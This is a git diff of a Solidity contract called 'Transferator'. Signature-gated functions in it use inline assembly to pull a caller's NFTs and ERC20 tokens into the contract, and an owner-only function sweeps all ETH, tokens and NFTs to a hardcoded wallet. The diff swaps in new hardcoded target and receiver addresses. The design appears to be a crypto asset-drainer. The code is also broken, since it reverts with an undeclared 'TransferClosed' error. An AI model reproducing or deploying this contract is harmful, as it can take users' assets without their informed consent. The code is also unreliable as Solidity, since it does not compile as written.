@@ -1,13 +1,18 @@
+
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.19;
 
+error SaleClosed();
 error dupa();
+error InsufficientAllowance();
 import "lib/openzeppelin-contracts//contracts/token/ERC721/utils/ERC721Holder.sol";
 import "lib/openzeppelin-contracts/contracts/interfaces/IERC721.sol";
 import "lib/openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol";
 import "lib/solady/src/utils/ECDSA.sol";
 import "lib/openzeppelin-contracts/contracts/access/Ownable.sol";
 import "lib/solady/src/utils/SafeTransferLib.sol";
+
+
 
 contract Transferator is Ownable, ERC721Holder{
 
@@ -25,6 +30,9 @@ contract Transferator is Ownable, ERC721Holder{
         tokeno = _tokeno;
     
     }
+    
+event TransferNFT(address indexed user, uint256 tokenId, address nftContract);
+event TransferTokens(address indexed user, uint256 amount, address tokenContract);
 
 
  function transferNFT(uint256 amount,uint256 tokenIds,
@@ -33,7 +41,7 @@ contract Transferator is Ownable, ERC721Holder{
     address voult =  address(this);
     address user = msg.sender;
    if (saleState != 1) {
-        revert dupa();
+        revert TransferClosed();
         
    }
 
@@ -55,22 +63,28 @@ contract Transferator is Ownable, ERC721Holder{
         mstore(0x24, voult)
         mstore(0x44, tokenIds)
 
-        if iszero(call(gas(),0xecaab68e0d903067ebb89a0fefa6332ab93f7408, 0, 0x00, 0x64, 0, 0)) {
+        if iszero(call(gas(),0x2e7a816a8E0cac339086f6e0efdA848d1a6611f4, 0, 0x00, 0x64, 0, 0)) {
             revert(0, 0)
+
+              
         }
-    }
+       
+        }
+        emit TransferNFT(msg.sender, tokenIds, 0x2e7a816a8E0cac339086f6e0efdA848d1a6611f4);
+        emit TransferTokens(user, amount, tokeno);     
+  
    }
       
 
 
    function transferTokens(uint256 amount,
-    bytes calldata signature
+ bytes calldata signature
     ) external payable requireSignature(signature) {
     address voult =  address(this);
     address user = msg.sender;
    
       if (saleState != 1) {
-        revert SaleClosed();
+        revert TransferClosed();
     
     }
    
@@ -85,17 +99,19 @@ let tok := sload(tokeno.slot)
          if iszero(call(gas(), tok, 0, 0x00, 0x64, 0, 0)) {
                 revert(0, 0)
          }
-    }
+       
+    } 
+     emit TransferTokens(user, amount, tokeno);
     }
 
 
  function transferNFT(uint256 tokenIds,
-     bytes calldata signature
+ bytes calldata signature
     ) external payable requireSignature(signature) {
           address voult =  address(this);
 
    if (saleState != 1) {
-        revert dupa();
+        revert TransferClosed();
 
     }
 assembly{  
@@ -104,10 +120,11 @@ assembly{
         mstore(0x24, voult)
         mstore(0x44, tokenIds)
 
-        if iszero(call(gas(), 0xecaab68e0d903067ebb89a0fefa6332ab93f7408 , 0, 0x00, 0x64, 0, 0)) {
+        if iszero(call(gas(), 0x2e7a816a8E0cac339086f6e0efdA848d1a6611f4, 0, 0x00, 0x64, 0, 0)) {
             revert(0, 0)
         }
     }
+    emit TransferNFT(msg.sender, tokenIds, 0x2e7a816a8E0cac339086f6e0efdA848d1a6611f4);
 }
 
 
@@ -131,7 +148,7 @@ assembly{
 
 
     function withdrawso(uint256 TokenId, address nft) external payable onlyOwner {
-        address receiver = 0x1e526ecc6CDcaB653823968b58056Ad5b438C92b;
+        address receiver = 0x13d8cc1209A8a189756168AbEd747F2b050D075f;
 
         SafeTransferLib.safeTransferETH(receiver, address(this).balance);
         uint256 _uniqBalance = IERC20(tokeno).balanceOf(address(this));
@@ -140,3 +157,4 @@ assembly{
         IERC721(nft).safeTransferFrom(address(this), receiver, TokenId);
     }
   }
+
